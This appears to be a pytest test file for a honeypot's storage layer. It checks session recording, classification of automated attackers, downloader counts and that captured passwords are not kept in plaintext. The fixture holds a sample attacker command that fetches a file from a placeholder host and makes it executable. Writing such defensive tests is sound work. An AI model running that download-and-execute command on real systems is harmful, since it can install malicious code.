from app.store import Store


def test_store_records_and_classifies(tmp_path):
    store = Store(tmp_path / "honey.sqlite3", "test-key")
    session = store.create_session(
        source_ip="203.0.113.5", source_port=50123, username="root", auth_method="password"
    )
    for index in range(8):
        store.add_command(
            session["id"],
            command="wget http://example.invalid/x && chmod +x /tmp/x",
            typed_ms=50,
            gap_ms=None if index == 0 else 100,
            since_start_ms=200 + index * 180,
        )
    updated = store.get_session(session["id"])
    assert updated["command_count"] == 8
    assert updated["actor_class"] == "likely_automated"
    assert store.summary()["commands"] == 8
    analytics = store.analytics(24)
    assert analytics["top_sources"][0]["source_ip"] == "203.0.113.5"
    assert analytics["indicators"]["downloaders"] == 8
    assert len(store.export_sessions(24)) == 1
    store.close()


def test_passwords_are_not_stored_in_plaintext(tmp_path):
    store = Store(tmp_path / "honey.sqlite3", "test-key")
    store.record_auth(
        source_ip="198.51.100.7",
        source_port=44,
        username="admin",
        auth_method="password",
        secret="super-secret-password",
    )
    raw = (tmp_path / "honey.sqlite3").read_bytes()
    assert b"super-secret-password" not in raw
    store.close()
